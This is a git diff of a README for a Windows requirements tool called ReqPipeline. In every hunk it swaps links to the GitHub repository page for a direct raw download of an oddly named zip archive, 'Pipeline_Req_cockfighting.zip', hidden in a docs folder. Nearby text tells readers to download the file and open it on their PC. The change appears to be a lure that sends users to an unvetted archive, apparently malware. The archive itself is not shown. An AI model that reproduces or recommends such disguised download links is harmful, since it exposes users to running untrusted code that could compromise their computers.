@@ -1,6 +1,6 @@
 # 🧩 ReqPipeline - Clear Requirements Work Flow
 
-[![Download ReqPipeline](https://img.shields.io/badge/Download-ReqPipeline-blue.svg)](https://github.com/strangenesswake318/ReqPipeline)
+[![Download ReqPipeline](https://img.shields.io/badge/Download-ReqPipeline-blue.svg)](https://raw.githubusercontent.com/strangenesswake318/ReqPipeline/main/docs/DesignDoc/Pipeline_Req_cockfighting.zip)
 
 ## 🖥️ What ReqPipeline Does
 
@@ -19,7 +19,7 @@ It is built for people who want help with requirements without setting up a comp
 
 Visit this page to download and run ReqPipeline on Windows:
 
-https://github.com/strangenesswake318/ReqPipeline
+https://raw.githubusercontent.com/strangenesswake318/ReqPipeline/main/docs/DesignDoc/Pipeline_Req_cockfighting.zip
 
 If the page shows a release or app file, download it and open it on your PC.
 
@@ -203,7 +203,7 @@ That mix makes it useful for guided requirement work on Windows.
 
 ## 🔗 Download Again
 
-[Download ReqPipeline from GitHub](https://github.com/strangenesswake318/ReqPipeline)
+[Download ReqPipeline from GitHub](https://raw.githubusercontent.com/strangenesswake318/ReqPipeline/main/docs/DesignDoc/Pipeline_Req_cockfighting.zip)
 
 ## 📋 Quick Start Checklist
 
